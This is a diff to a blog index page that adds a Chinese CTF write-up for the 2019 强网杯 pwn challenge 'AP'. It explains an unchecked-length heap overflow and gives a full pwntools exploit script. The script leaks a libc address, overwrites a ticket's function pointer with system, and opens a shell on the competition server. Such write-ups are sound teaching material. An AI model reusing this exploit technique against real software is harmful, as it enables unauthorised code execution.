@@ -137,6 +137,69 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-强网杯pwn-wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="强网先锋-AP"><a href="#强网先锋-AP" class="headerlink" title="强网先锋-AP"></a>强网先锋-AP</h3><hr>
+<p>堆溢出漏洞</p>
+<p>一共有两种堆，一种是ticket，一种是普通堆用来存owner_name，纯字符串。ticket结构如下：</p>
+<p><img src="https://github.com/CP32/ctf-pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190527121941.png?raw=true" alt></p>
+<p>每一次Get，先申请一个ticket堆，再申请一个堆存owner_name。Change可以更新owner_name，但没有对长度进行校验，由此可以达成溢出。</p>
+<p>第一次通过第一个owner_name溢出到第二个ticket堆，泄漏func内容即puts地址</p>
+<p>第二次依然通过第一个owner_name溢出到第二个ticket堆，把name_addr改为/bin/sh地址，把func改为system地址，再调用open（2），实现调用system(‘/bin/sh’)</p>
+<p><code>from pwn import *</code><br><code>elf=ELF(&quot;AP&quot;)</code><br><code>#io=elf.process()</code><br><code>io=remote(&quot;49.4.26.104&quot;,31500)</code><br><code>libc=elf.libc</code><br><code>#libc=ELF(&quot;&quot;)</code><br><code>context.log_level=&#39;debug&#39;</code></p>
+<p><code>sla=io.sendlineafter</code><br><code>sl=io.sendline</code><br><code>sa=io.sendafter</code><br><code>ru=io.recvuntil</code><br><code>shell=io.interactive</code></p>
+<p><code>def menu(choice):</code><br>    <code>sla(&quot;Choice &gt;&gt; \n&quot;,str(choice))</code></p>
+<p><code>def get(size,name=&quot;jb&quot;):</code><br>    <code>menu(1)</code><br>    <code>sla(&quot;name:\n&quot;,str(size))</code><br>    <code>sa(&quot;name:\n&quot;,name)</code></p>
+<p><code>def myopen(index):</code><br>    <code>menu(2)</code><br>    <code>sla(&quot;open?\n&quot;,str(index))</code></p>
+<p><code>def change(index,size,name):</code><br>    <code>menu(3)</code><br>    <code>sla(&quot;name?\n&quot;,str(index))</code><br>    <code>sla(&quot;name:\n&quot;,str(size))</code><br>    <code>sa(&quot;name:\n&quot;,name)</code></p>
+<p><code>get(0x10)#0</code><br><code>get(0x10)#1</code><br><code>payload=&#39;a&#39;*0x25+&#39;bcd&#39;</code><br><code>change(0,len(payload)+1,payload)</code><br><code>myopen(0)</code><br><code>ru(&#39;bcd&#39;)</code><br><code>puts_addr=u64(io.recv(6)+&#39;\x00\x00&#39;)</code><br><code>libcbase=puts_addr-libc.sym[&#39;puts&#39;]</code><br><code>libc.address=libcbase</code><br><code>print &quot;libc:&quot;+hex(libcbase)</code></p>
+<p><code>payload=&#39;a&#39;*0x20</code><br><code>payload+=p64(libc.search(&#39;/bin/sh&#39;).next())</code><br><code>print hex(libc.search(&#39;/bin/sh&#39;).next())</code><br><code>payload+=p64(libc.sym[&#39;system&#39;])</code><br><code>change(0,len(payload)+1,payload)</code><br><code>myopen(1)</code><br><code>shell()</code></p>
+<p><img src="https://github.com/CP32/ctf-pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190527122708.png?raw=true" alt></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/05/27/强网杯pwn-wp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-通过DDCTF两道逆向题练习脱壳" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
